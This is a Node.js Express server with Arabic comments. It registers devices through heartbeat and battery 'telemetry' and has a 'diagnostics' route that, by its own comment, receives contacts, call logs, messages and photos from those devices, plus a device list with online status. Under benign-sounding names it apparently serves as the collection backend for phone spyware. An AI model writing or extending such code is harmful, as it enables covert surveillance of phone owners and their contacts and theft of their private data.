const express = require('express');
const app = express();
app.use(express.json());

// تخزين مؤقت للأجهزة المتصلة
let devices = {};

// استقبال بيانات الـ Telemetry والنبضات (Heartbeat) ومعلومات البطارية
app.post('/api/telemetry', (req, res) => {
    const { deviceId, model, battery } = req.body;
    if (deviceId) {
        devices[deviceId] = {
            id: deviceId,
            model: model || deviceId,
            battery: battery !== undefined ? battery : 0,
            status: 'connected',
            lastSeen: Date.now()
        };
        return res.status(200).json({ success: true, message: "Telemetry received" });
    }
    res.status(400).json({ success: false, message: "Invalid deviceId" });
});

// مسار استقبال الـ Diagnostics العامة (جهات الاتصال، المكالمات، الرسائل، الصور، الـ ping)
app.post('/api/diagnostics/:type', (req, res) => {
    const { type } = req.params;
    const { deviceId, items } = req.body;
    
    if (deviceId && devices[deviceId]) {
        devices[deviceId].lastSeen = Date.now();
        devices[deviceId].status = 'connected';
    }
    
    // يمكنك طباعة أو حفظ البيانات هنا حسب رغبتك
    console.log(`Received [${type}] from device: ${deviceId}`);
    res.status(200).json({ success: true });
});

// جلب قائمة الأجهزة للواجهة
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    // التحقق من حالة الاتصال (إذا لم يرسل نبضة لأكثر من 45 ثانية يتحول إلى غير متصل)
    Object.keys(devices).forEach(id => {
        if (now - devices[id].lastSeen > 45000) {
            devices[id].status = 'disconnected';
        }
    });
    
    res.json({ devices: Object.values(devices) });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
